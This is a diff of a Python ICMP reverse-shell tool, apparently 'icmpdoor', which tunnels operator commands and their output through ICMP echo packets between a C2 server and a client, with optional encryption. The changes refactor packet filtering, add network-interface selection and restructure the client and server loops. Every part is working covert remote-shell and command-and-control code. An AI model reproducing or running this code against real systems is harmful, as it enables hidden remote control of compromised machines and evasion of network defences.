@@ -18,12 +18,12 @@ More info: https://cryptsus.com/blog/icmp-reverse-shell.html
 """
 
 class Icmpdoor():
-    __slots__ = ('DIP', 'ICMP_ID', 'OTP', 'TTL', 'args', 'clientIP', 'seqCounter', 'serverIP', 'svr')
+    __slots__ = ('ICMP_ID', 'OTP', 'TTL', 'args', 'clientIP', 'seqCounter', 'serverIP', 'svr')
     def __init__(self, args):
         """A class for tracking and encrypting the shell"""
         if args.destination_ip is None:
-            self.clientIP = '192.168.0.100'                                     ## CHANGE ME MAYBE
-            self.serverIP = '192.168.0.101'                                     ## CHANGE ME MAYBE
+            self.clientIP = '192.168.0.101'                                     ## CHANGE ME MAYBE
+            self.serverIP = '192.168.0.107'                                     ## CHANGE ME MAYBE
         else:
             if args.mode == 'server':
                 self.clientIP = args.destination_ip
@@ -46,29 +46,18 @@ class Icmpdoor():
         if args.mode == 'server':
             self.svr = self.serverShell()
 
-    def LFILTERc(self, type):
-        """ICMP type filtering"""
+    def LFILTER(self, it):
+        """IP address and ICMP ID filtering"""
         def snarf(pkt):
-            if pkt[IP].src == self.serverIP:
-                if pkt[ICMP].type == type:
-                    if pkt[ICMP].id == self.ICMP_ID:
-                        if pkt[Raw].load:
-                            return True
-        return snarf
-
-
-    def LFILTERs(self, type):
-        """ICMP type filtering"""
-        def snarf(pkt):
-            if pkt[IP].src == self.clientIP:
-                if pkt[ICMP].type == type:
+            if pkt[IP].src == it[0]:
+                if pkt[ICMP].type == it[1]:
                     if pkt[ICMP].id == self.ICMP_ID:
                         if pkt[Raw].load:
                             return True
         return snarf
 
     def clientShell(self):
-        """prn in sniff()"""
+        """Run commands remotely and return the stdout"""
         def snarf(pkt):
             try:
                 if self.args.plaintext is False:
@@ -91,7 +80,10 @@ class Icmpdoor():
                 icmppacket = (IP(dst = self.serverIP, ttl = self.TTL)/\
                               ICMP(type = 0, id = self.ICMP_ID, seq = self.seqCounter)/\
                               Raw(load = OTP))
-                sr(icmppacket, timeout = 0, verbose = 0)
+                if self.args.interface is None:
+                    sr(icmppacket, timeout = 0, verbose = 0)
+                else:
+                    sr(icmppacket, iface = self.args.interface, timeout = 0, verbose = 0)
                 self.seqCounter += 1
             except:
                 return False
@@ -100,12 +92,10 @@ class Icmpdoor():
     def otpGen(self, password):
         """Generate a new key"""
         salt = os.urandom(16)
-        kdf = PBKDF2HMAC(
-            algorithm=hashes.SHA256(),
-            length=32,
-            salt=salt,
-            iterations=480000,
-        )
+        kdf = PBKDF2HMAC(algorithm = hashes.SHA256(),
+                         length = 32,
+                         salt = salt,
+                         iterations = 480000)
         return base64.urlsafe_b64encode(kdf.derive(password.encode()))
 
     def serverShell(self):
@@ -124,13 +114,13 @@ class Icmpdoor():
         """Sniff for the return output from the client"""
         if args.interface is None:
             sniff(prn = self.svr,
-                  lfilter = self.LFILTERs,
+                  lfilter = self.LFILTER,
                   filter = 'icmp',
                   store = 0)
         else:
             sniff(iface = args.interface,
                   prn = self.svr,
-                  lfilter = self.LFILTERs,
+                  lfilter = self.LFILTER,
                   filter = 'icmp',
                   store = 0)
 
@@ -160,52 +150,61 @@ if __name__ == '__main__':
     args = parser.parse_args()
     idr = Icmpdoor(args)
 
-    ## Client mode
-    if args.mode is None or args.mode == 'client':
-        PRN = idr.clientShell()
-        LFILTER = idr.LFILTERc(8)
-        print("[+]ICMP listener starting!")
+    ## OTP generation
+    if args.generate_key is not False:
+        print(idr.otpGen(input('Password?\n')))
 
-        if args.interface is None:
-            sniff(prn = PRN,
-                  lfilter = LFILTER,
-                  filter = 'icmp',
-                  store = 0)
-        else:
-            sniff(iface = args.interface,
-                  prn = PRN,
-                  lfilter = LFILTER,
-                  filter = 'icmp',
-                  store = 0)
-
-    ## Server mode
+    ## Operational modes
     else:
-        sniffing = Process(target = idr.serverSniff)
-        sniffing.start()
-        LFILTER = idr.LFILTERs(0)
-        print("[+]ICMP C2 started!")
-        while True:
-            icmpshell = input("shell: ")
-            if icmpshell == 'exit':
-                print("[+]Stopping ICMP C2...")
-                sniffing.terminate()
-                break
-            elif icmpshell == '':
-                pass
+
+        ## Client mode
+        if args.mode is None or args.mode == 'client':
+            LFILTER = idr.LFILTER((idr.serverIP, 8))
+            PRN = idr.clientShell()
+            print("[+]ICMP listener starting!")
+            if args.interface is None:
+                sniff(prn = PRN,
+                      lfilter = LFILTER,
+                      filter = 'icmp',
+                      store = 0)
             else:
-                if args.plaintext is False:
-                    payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
-                               ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
-                               Raw(load = idr.OTP.encrypt(icmpshell.encode())))
+                sniff(iface = args.interface,
+                      prn = PRN,
+                      lfilter = LFILTER,
+                      filter = 'icmp',
+                      store = 0)
+
+        ## Server mode
+        else:
+            LFILTER = idr.LFILTER((idr.clientIP, 0))
+            sniffing = Process(target = idr.serverSniff)
+            sniffing.start()
+            print("[+]ICMP C2 started!")
+            while True:
+                icmpshell = input("shell: ")
+                if icmpshell == 'exit':
+                    print("[+]Stopping ICMP C2...")
+                    sniffing.terminate()
+                    break
+                elif icmpshell == '':
+                    pass
                 else:
-                    payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
-                               ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
-                               Raw(load = icmpshell.encode()))
-                sr(payload, timeout = 0, verbose = 0)
-                idr.seqCounter += 1
-            if icmpshell == '___otp___':
-                print("[+]Deleting ICMP C2...")
-                time.sleep(2)
-                sniffing.terminate()
-                break
-        sniffing.join()
+                    if args.plaintext is False:
+                        payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
+                                   ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
+                                   Raw(load = idr.OTP.encrypt(icmpshell.encode())))
+                    else:
+                        payload = (IP(dst = idr.clientIP, ttl = idr.TTL)/\
+                                   ICMP(type = 8, id = idr.ICMP_ID, seq = idr.seqCounter)/\
+                                   Raw(load = icmpshell.encode()))
+                    if args.interface is None:
+                        sr(payload, timeout = 0, verbose = 0)
+                    else:
+                        sr(payload, iface = args.interface, timeout = 0, verbose = 0)
+                    idr.seqCounter += 1
+                if icmpshell == '___otp___':
+                    print("[+]Deleting ICMP C2...")
+                    time.sleep(2)
+                    sniffing.terminate()
+                    break
+            sniffing.join()
